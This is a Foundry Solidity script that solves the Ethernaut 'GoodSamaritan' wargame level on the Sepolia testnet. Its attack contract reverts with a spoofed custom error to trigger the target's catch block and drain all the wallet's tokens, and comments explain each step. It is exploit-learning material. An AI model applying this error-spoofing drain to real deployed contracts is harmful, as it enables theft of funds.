// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import "../src/levels/GoodSamaritan.sol";

/*
    Solution script for the Ethernaut Level 9: GoodSamaritan

    1. Add your priate key to the cast wallet keystore
    2. Replace the instance address used in GoodSamaritanScript
    3. (Dry) Run the forge script replace sender address with your wallet address
    4. Run the forge script again with the --broadcast flag

    ```
    cast wallet import auditor --interactive

    forge script script/GoodSamaritan.s.sol:GoodSamaritanScript \
        --rpc-url sepolia \
        --account auditor \
        --sender 0x471cd8eaa5d60c2ed4dd42cc3b0de75ecfbbda62 \
        -vv
    ```

    Results of running this script (with --broadcast) are in this scripts 
    designated broadcast folder: contracts/broadcast/GoodSamaritan.s.sol/11155111
*/

contract GoodSamaritanAttack {
    GoodSamaritan target;

    error NotEnoughBalance();

    constructor(address _target) {
        target = GoodSamaritan(_target);
    }
    
    function attack() external {
        target.requestDonation();
    }

    function notify(uint256 amount) external view {
        // we only need to revert with the custom erro when the amount is <=10 tokens
        // otherwise we will never reveive the full wallet balance of 1000000 tokens
        if (amount <= 10) {
            revert NotEnoughBalance();
        }
    }
}

contract GoodSamaritanScript is Script {
    // replace instance with your level1 instance adddress
    address payable instance = payable(0xee94Dd43d103d9A8c687c9e1b4ED21f7E47A4C1F);
    GoodSamaritan level27  = GoodSamaritan(instance); 
    Coin token = level27.coin();
    Wallet wallet = level27.wallet();

    function run() external {
        vm.startBroadcast();

        /*
            source: https://blog.dixitaditya.com/ethernaut-level-27-good-samaritan?source=more_series_bottom_blogs
            
            The attack sequence is as follows:

            1. In GoodSamaritanAttack attack function We make a call to requestDonation() and the execution flow 
            goes to wallet.donate10(msg.sender).

            2. The wallet contract calls coin.transfer()

            3. The coin.transfer() function does the necessary calculations, checks if our address is a contract, 
            and then calls a notify() function on our address.

            4. This is where we attack. We create a notify() function in our contract and make it revert a custom 
            error with the name NotEnoughBalance(). This will trigger the error in the GoodSamaritan.requestDonation() 
            function and the catch() block will be triggered transferring us all the tokens.

            5. But wait, there's another catch! Transferring all the tokens won't work because our contract will 
            just revert the transaction. To counter this, we will need to add another condition to our notify() function 
            to check if the amount <= 10, and then only revert.
        */
        GoodSamaritanAttack attack = new GoodSamaritanAttack(instance);
        attack.attack();

        // console.log("Coin balance of attack", token.balances(address(attack)));
        // console.log("Coin balance of wallet", token.balances(address(wallet)));

        // the GoodSamaritan wallet should be drained and the  
        // attack contract should have all the tokens
        require(token.balances(address(wallet)) == 0, 'GoodSamaritan wallet was not drained');
        require(token.balances(address(attack)) == 1000000, 'attack contract did not receive the tokens');

        vm.stopBroadcast();
    }
}